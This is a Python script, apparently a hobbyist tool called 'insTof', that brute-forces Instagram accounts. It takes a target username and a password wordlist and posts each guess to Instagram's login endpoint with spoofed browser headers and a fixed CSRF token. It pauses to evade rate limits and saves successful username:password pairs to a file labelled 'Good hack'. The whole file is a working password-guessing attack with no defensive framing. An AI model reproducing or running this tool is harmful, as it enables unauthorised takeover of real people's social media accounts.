import sys , os , threading
import requests , json
import time
from time import sleep
from datetime import datetime
normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"
onlyPasswords = False  
r = requests.session()


print(detect_color+'''
                               ....
                                    %
                                     ^
                            L
                            "F3  $r
                           $$$$.e$"  .
                           "$$$$$"   "
     (insTof by 8.1v)        $$$$c  /
        .                   $$$$$$$P
       ."c                      $$$
      .$c3b                  ..J$$$$$e
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
          
''')

print ('''
==============================================
[developer] => FaLaH - 0xfff0800 [developer_email] => flaaah777@gmail.com ) 
[developer_snapchat] => flaah999
==============================================
''')


print('')
user = input (end_banner_color+"Usernames => ")
flo = input ("List Of Passwords => ")
linux = 'clear'
windows = 'cls'


password = open(flo).read().splitlines()
for password in password:
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })
        for i in range(2):
            if i ==1:
                os.system([linux, windows][os.name == 'nt'])
                print('\nsleeping 15 min..')
                sleep(15)
                continue
            r=s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })

            if 'checkpoint_url' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
                    exit()					
            if 'userId' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            if 'error' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> عذرا ، كانت هناك مشكلة في طلبك '))
            elif 'status' in r.text:
              print (end_banner_color + "---------------------------------------")
              print ((red_color + ' --> ' + user + ' : ' + password))
              print ((red_color + ' --> Error '))
              x=(password)
              sleep(4)
              sys.stdout.write(f'\rplease wait ..')
              os.system([linux, windows][os.name == 'nt'])
              print(r.text)

   


